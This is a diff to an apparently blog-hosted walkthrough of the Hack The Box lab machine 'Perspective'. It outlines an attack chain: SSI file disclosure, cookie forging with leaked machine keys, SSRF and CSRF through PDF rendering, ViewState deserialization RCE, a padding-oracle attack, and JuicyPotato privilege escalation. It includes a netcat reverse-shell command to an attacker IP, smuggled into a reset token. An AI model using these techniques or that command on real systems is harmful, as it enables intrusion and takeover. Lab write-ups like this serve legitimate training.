@@ -12,9 +12,67 @@ description: "Complete walkthrough of Perspective HTB machine featuring ASP.NET 
 
 {{< youtube tmK0GIvnq6s >}}
 
-Perspective is an Insane difficulty Windows machine from Hack The Box that showcases advanced ASP.NET exploitation techniques. This machine requires expertise in web application security, cryptographic attacks, and Windows privilege escalation, featuring a complex attack chain involving Server-Side Includes, ViewState deserialization, SSRF, and padding oracle attacks.
+1. **Initial Reconnaissance**:
+   - Perform Nmap scan on the target IP (10.10.11.151) to identify open ports: SSH (22) and HTTP (80) running IIS.
+   - Access the web app on port 80, which redirects to perspective.htb (add to /etc/hosts).
+   - Identify the web app as an ASP.NET application by testing file extensions (e.g., .aspx gives different 404 error).
 
-## Key Exploitation Steps and Techniques (Chronological Order)
+2. **User Registration and Login**:
+   - Register a user account (e.g., root@perspective.htb) and log in.
+   - Test password reset functionality, noting security questions and a token in the request.
+
+3. **Unintended Admin Access via Password Reset Bypass** (Mentioned but skipped for intended path):
+   - Intercept password reset request and change email to admin@perspective.htb to reset admin password and gain admin access.
+
+4. **File Upload Vulnerability Testing**:
+   - As logged-in user, upload products with images.
+   - Fuzz allowed file extensions using ffuf on the upload request, identifying extensions like .php4, .shtml, etc.
+   - Attempt PHP upload fails to execute, but .shtml allows Server-Side Includes (SSI).
+
+5. **Local File Inclusion (LFI) via SSI in .shtml**:
+   - Upload .shtml file with SSI directive (<!--#include file="web.config"--> or similar) to read web.config.
+   - Traverse directories (e.g., ../web.config) to read root web.config.
+   - Extract key info: Machine key (validationKey and decryptionKey), encrypted viewStateUserKey, MSSQL connection string, and reference to Secure Password Service on localhost:8000.
+
+6. **Forge Admin Cookie (.ASPXAUTH)**:
+   - Use machine key from web.config to decrypt an existing .ASPXAUTH cookie (using custom .NET tool from GitHub: AFNetCryptoTools).
+   - Modify decrypted ticket to admin@perspective.htb, re-encrypt, and set as cookie to gain admin access.
+
+7. **SSRF via PDF Generation in Admin Panel**:
+   - As admin, load user data and generate PDF.
+   - Inject HTML (e.g., <meta http-equiv="refresh" content="0;url=http://10.10.14.8:8000/pwned.html">) into product description to trigger SSRF during PDF rendering (using headless Chrome).
+   - Redirect to localhost:8000 to access Secure Password Service API.
+   - Fetch /swagger/v1/swagger.json to understand API: /encrypt (GET) and /decrypt (POST) endpoints.
+
+8. **Decrypt viewStateUserKey via CSRF in SSRF**:
+   - Craft HTML form in redirected page to POST to http://127.0.0.1:8000/decrypt with ciphertext=encoded_viewStateUserKey.
+   - Use JavaScript to auto-submit form (bypassing CSRF protections).
+   - Generate PDF to trigger, revealing decrypted viewStateUserKey ("saltySaltyViewState3").
+
+9. **RCE via Malicious ViewState Deserialization**:
+   - Use ysoserial.net with ViewState plugin, TypeConfuseDelegate gadget, machine key, decryption/validation algorithms, viewStateUserKey, and generator from a request.
+   - Command: ping 10.10.14.8 (test), then PowerShell reverse shell (encoded base64).
+   - Intercept request, replace __VIEWSTATE with malicious blob to get RCE as webuser.
+
+10. **Stable Shell via SSH**:
+    - From reverse shell (as webuser), extract ~/.ssh/id_rsa.
+    - Copy to attack machine, chmod 600, and SSH as webuser@10.10.11.151.
+
+11. **Access Staging App via Port Forward**:
+    - From SSH shell, identify listening ports (e.g., 8009 via netstat).
+    - Local port forward: ssh -L 8009:127.0.0.1:8009.
+    - Access http://127.0.0.1:8009 (staging app, environment=staging, auto-generated machine keys preventing deserial).
+
+12. **Padding Oracle Attack on Staging Password Reset Token**:
+    - In staging app, register user and initiate password reset to get encrypted token.
+    - Use PadBuster on token (block size 16, URL-encoded base64, post data, error string "padding is invalid").
+    - Plaintext: Craft command injection (e.g., "root@perspective.htb && c:\programdata\nc.exe 10.10.14.8 9001 -e cmd.exe").
+    - Encrypt with PadBuster and submit in reset request to get reverse shell as administrator (due to staging running as admin).
+
+13. **Privilege Escalation to SYSTEM via JuicyPotato**:
+    - As administrator, upload JuicyPotato.exe and test.bat (with reverse shell).
+    - Scan for unfiltered COM ports (e.g., 443).
+    - Run JuicyPotato with -p shell.bat -t * -l 443 to get shell as SYSTEM. List all the gaps in each service or systems, that can be fixed with either proper source code fix or configuration fix.
 
 ### Phase 1: Initial Reconnaissance and Web Application Discovery
 
